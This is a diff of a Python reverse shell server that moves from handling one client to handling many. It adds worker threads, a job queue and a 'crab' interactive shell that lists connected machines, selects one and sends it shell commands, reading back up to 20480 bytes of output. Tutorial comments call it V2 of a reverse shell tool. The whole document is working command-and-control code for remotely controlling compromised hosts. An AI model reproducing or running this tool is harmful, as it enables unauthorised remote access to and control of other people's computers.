@@ -68,7 +68,7 @@ def bind_socket():
 
 # Hanlding connections from multiple client and saving to a list
 
-def accepting_connection():
+def accepting_connections():
     # first make sure to close all previous connections in that list that were opened in a previous run if any
     for c in all_connections:
         c.close()
@@ -101,20 +101,21 @@ def accepting_connection():
 # function above will show list of all connections. 'crab' keyword used to access custom functions (crab shell)
 
 def start_crab():
-    cmd = input('crab> ')
+   
+    while True:
+        cmd = input('crab> ')
+        if cmd == 'list':
+            list_connections()
 
-    if cmd == 'list':
-        list_connections()
-
-    # else if the 'select' statement is somewhere in that cmd function
-    elif 'select' in cmd:
-        conn = get_target(cmd)
-        # checks if the connection object exists or not
-        if conn is not None:
-            # send commands to that specific client
-            send_target_commands(conn)
-    else:
-        print("Command not recognized as valid command in crab shell")
+        # else if the 'select' statement is somewhere in that cmd function
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            # checks if the connection object exists or not
+            if conn is not None:
+                # send commands to that specific client
+                send_target_commands(conn)
+        else:
+            print("Command not recognized as valid command in crab shell")
 
 # Display all current active connections with the client
 def list_connections():
@@ -157,56 +158,78 @@ def get_target(cmd):
     except:
         print("Selection not valid")
 
-
-# Following are the accept and send socket functions for when hanlding a SINGLE client Machine.
-# However in V2 of this Reverse Shell tool, when handling multiple clients, these functions  were done differently
-#  Function to establish connection with a SINGLE client (assuming the socket is listening already)
-def accept_socket():
-
-    # s.accpet() outputs an object of the connection or conversation
-    # as well as a second output which is a list containing IP address and a port
-    # so we initialized two new variables to hold each of these outputs
-    conn, address = s.accept()
-
-    # print out first element of the list (ip address) and the second element which is the port number of the client
-    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
-
-    # once connection has been established we can send commands over this connection to the client (other computer)
-    # done through another custom function called send_commands (defined below)
-    send_commands(conn)
-    conn.close() # after socket has been established, we need to close the connection
-
-# Function to send commands to a SINGLE client computer
-def send_commands(conn):
-
+# send commands to client(target machine)
+def send_target_commands(conn):
     # conduct infinite while loop allowing us to send multiple commands before connection gets closed
     while True:
-        # takes input from command prompt
-        cmd = input()
+        try:
+            # takes input from command prompt
+            cmd = input()
 
-        # if command is to quit
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            # remembering to close the command prompt as well
-            sys.exit()
+            # if command is to quit
+            if cmd == 'quit':
+                # This will break the while True loop and will go back to start_crab function
+                break
 
-        # anything travelling over the connection between 2 computers is sent in bytes
-        # to actually know if the user typed something into the command prompt we need to encode to bytes
-        # and check if the length of that byte string is > 0. if it is, this means a command has been entered into cmd
-        if len(str.encode(cmd)) > 0:
-            # to send messages got to be converted from string to bytes
-            conn.send(str.encode(cmd))
-            # to receive messages got to be converted from bytes to string
-            # in this case using the encoding format of utf-8 and in chunks of 1024 bits
-            client_response = str(conn.recv(1024),"utf-8")
+            # anything travelling over the connection between 2 computers is sent in bytes
+            # to actually know if the user typed something into the command prompt we need to encode to bytes
+            # and check if the length of that byte string is > 0. if it is, this means a command has been entered into cmd
+            if len(str.encode(cmd)) > 0:
+                # to send messages got to be converted from string to bytes
+                conn.send(str.encode(cmd))
+                # to receive messages got to be converted from bytes to string
+                # in this case using the encoding format of utf-8 and in chunks of 1024 bits
+                client_response = str(conn.recv(20480), "utf-8")
 
-            # end="" basically allows the command prompt to go to the next line after generating output (as it would)
-            print(client_response, end="")
+                # end="" basically allows the command prompt to go to the next line after generating output (as it would)
+                print(client_response, end="")
+        except:
+            print("Error sending commands")
+            # break statement needed here as well so incase one connection becomes inactive, go back out to start_crab
+            break
 
-def main():
-    create_socket()
-    bind_socket()
-    accept_socket()
 
-main()
+# Create worker threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+
+        # creating a thread
+        # 'target' parameter is used to specify the kind of work the thread will do
+        # in this case one thread is needed for hanlding connections and one for sending commands
+        t = threading.Thread(target=work)
+
+        # this daemon being True will make sure that whenever the program ends, make sure the thread also ends.
+        # this will make sure memory is not overloaded
+        t.daemon = True
+
+        t.start()
+
+#o next job that is in the queue
+def work():
+    while True:
+        x = queue.get() # gets job number from the queue. Possible ones are only 1 or 2 since we have 2 jobs currently
+
+        # first thread responsible for setting up the connections
+        if x == 1:
+            create_socket()
+            bind_socket()
+            accepting_connections()
+        # second thread responsible for crab shell (sending commands)
+        if x == 2:
+            start_crab()
+
+        queue.task_done()
+
+
+
+def create_jobs():
+    # currently set at 2 jobs so x will start at 1
+    for x in JOB_NUMBER:
+        # Jobs are held in a queue not a list
+        queue.put(x)
+
+    queue.join()
+
+
+create_workers()
+create_jobs()
